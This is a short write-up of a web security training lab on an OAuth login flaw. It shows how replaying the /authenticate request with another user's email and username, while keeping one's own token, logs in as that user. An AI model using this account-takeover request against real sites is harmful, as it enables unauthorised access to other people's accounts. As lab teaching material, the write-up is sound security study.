
# Lab 1

## Description

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password.

To solve the lab, log in to Carlos's account. His email address is `carlos@carlos-montoya.net`.

You can log in with your own social media account using the following credentials: `wiener:peter`.

## Solution

Going through the complete OAuth process with `wiener:peter` credentials reveals following request after the social media login is complete:

```
POST /authenticate HTTP/2
Host: 0a28007803769e07803417c700b0006b.web-security-academy.net
[...]

{"email":"wiener@hotdog.com","username":"wiener","token":"0P-_TSNwriNcCLHWp7-FWhtTRsSvELWNrLfdE5IWa6T"}
```

which is basically the OAuth mechanism coming back to the server confirming the user. Trying `carlos` credentials:

```
POST /authenticate HTTP/2
Host: 0a28007803769e07803417c700b0006b.web-security-academy.net
[...]

{"email":"carlos@carlos-montoya.net","username":"carlos","token":"0P-_TSNwriNcCLHWp7-FWhtTRsSvELWNrLfdE5IWa6T"}
```

sending the request and showing the response in browser solves the lab.


